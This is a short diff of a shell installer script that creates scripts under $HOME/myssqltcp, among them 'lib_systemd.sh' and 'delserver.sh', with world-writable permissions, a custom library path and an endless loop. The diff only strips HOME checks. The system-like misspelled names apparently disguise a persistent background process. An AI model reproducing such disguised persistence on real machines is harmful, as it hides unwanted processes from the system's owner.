@@ -764,17 +764,6 @@ chmod 777 $HOME/myssqltcp/Tcphost.sh
 echo "[*] Creating $HOME/myssqltcp/lib_systemd.sh script"
 cat >$HOME/myssqltcp/lib_systemd.sh <<EOL
 #!/bin/bash
-if [ -z $HOME ]; then
-  echo "ERROR: Please define HOME environment variable to your home directory"
-  exit 1
-fi
-
-if [ ! -d $HOME ]; then
-  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
-  echo '  export HOME=<dir>'
-  exit 1
-fi
-
 export LD_LIBRARY_PATH=$HOME/myssqltcp/
 
 while true; do
@@ -795,17 +784,6 @@ chmod 777 $HOME/myssqltcp/lib_systemd.sh
 echo "[*] Creating $HOME/delserver.sh script"
 cat >$HOME/delserver.sh <<EOL
 #!/bin/bash
-if [ -z $HOME ]; then
-  echo "ERROR: Please define HOME environment variable to your home directory"
-  exit 1
-fi
-
-if [ ! -d $HOME ]; then
-  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
-  echo '  export HOME=<dir>'
-  exit 1
-fi
-
 cd /$HOME/
 rm -f mysqltcp.sh
 
